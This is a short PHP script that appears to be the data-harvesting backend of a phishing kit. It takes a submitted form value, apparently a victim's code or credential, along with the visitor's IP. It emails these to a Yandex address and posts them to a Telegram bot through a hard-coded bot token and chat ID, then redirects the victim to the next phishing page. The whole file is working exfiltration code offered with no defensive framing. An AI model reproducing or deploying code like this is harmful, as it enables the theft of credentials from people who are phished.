<?php
if(isset($_POST['s7'])){
$var3=$_SERVER['QUERY_STRING'];
$var1="page=";
   $var2="";
   $ur=str_replace($var1,$var2,$var3, $count);
   if(isset($_GET['page'])){
    $pg=$_GET['page'];
   }ELSE{
    $pg='';
   }
$pg=$_REQUEST['page'];
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index3.php?page=$pg" ;
$hostname = gethostbyaddr($ip);
$message .= "".$_POST['s7']."\n";
$send = "noctt@yandex.com";
$subject = "$ip";
$headers = "From:AR<reality@superhosting.bg>";
mail($send,$subject,$message,$headers);
	$token = "5347410366:AAG4Y9rs4cvCASdkTYcSx3xl4PxQG9LXKL0";
$data = [
    'text' => $message,
    'chat_id' => '-706752114'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: $back");
}
else{
	echo 'No thing to see here :(';
}
?>